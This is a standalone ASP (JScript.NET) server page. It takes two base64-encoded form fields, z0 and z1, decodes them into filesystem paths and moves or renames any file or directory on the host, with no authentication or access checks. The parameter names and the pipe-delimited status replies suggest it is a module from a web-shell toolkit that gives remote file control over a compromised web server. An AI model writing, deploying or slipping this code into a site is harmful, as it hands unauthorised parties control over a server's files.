<%

function base64Decode(str) {
    if (!str || str.Trim() == "") return "";
    try {
        var bytes = System.Convert.FromBase64String(str);
        return System.Text.Encoding.UTF8.GetString(bytes);
    } catch(e) { return ""; }
}

Response.Buffer = true;
Response.ContentType = "text/plain";

var z0 = Request.Form["z0"] ? Request.Form["z0"] + "" : "";
var z1 = Request.Form["z1"] ? Request.Form["z1"] + "" : "";

var srcPath = base64Decode(z0);
var dstPath = base64Decode(z1);

try {
    if (srcPath == "" || dstPath == "") {
        Response.Write("0|Source or Destination path is empty.");
    } 
    
    else if (System.IO.Directory.Exists(srcPath)) {
        if (!System.IO.Directory.Exists(dstPath)) {
            System.IO.Directory.Move(srcPath, dstPath);
            Response.Write("1|");
        } else {
            Response.Write("0|Destination folder already exists.");
        }
    } 
    
    else if (System.IO.File.Exists(srcPath)) {
        if (!System.IO.File.Exists(dstPath)) {
            System.IO.File.Move(srcPath, dstPath);
            Response.Write("1|");
        } else {
            Response.Write("0|Destination file already exists.");
        }
    } 
    else {
        Response.Write("0|Source does not exist.");
    }
} catch(e) {
    Response.Write("0|" + e.message);
}

%>